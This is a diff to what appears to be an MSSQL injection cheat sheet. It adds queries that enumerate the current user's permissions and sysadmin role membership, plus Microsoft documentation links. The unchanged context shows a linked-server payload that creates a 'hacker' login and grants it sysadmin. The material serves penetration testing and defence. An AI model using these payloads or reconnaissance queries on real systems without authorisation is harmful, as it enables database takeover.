@@ -23,6 +23,7 @@
     * [MSSQL UNC path](#mssql-unc-path)
 * [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
 * [MSSQL Trusted Links](#mssql-trusted-links)
+* [MSSQL List permissions](#mssql-list-permissions)
 
 ## MSSQL Comments
 
@@ -297,6 +298,33 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
+## List permissions
+
+Listing effective permissions of current user on the server.
+
+```sql
+SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
+```
+
+Listing effective permissions of current user on the database.
+
+```sql
+SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
+```
+
+Listing effective permissions of current user on a view.
+
+```
+SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
+```
+
+Check if current user is a member of the specified server role.
+
+```sql
+-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
+SELECT is_srvrolemember('sysadmin');
+```
+
 ## References
 
 * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
@@ -306,3 +334,5 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
 * [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
 * [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
+* [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
+* [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
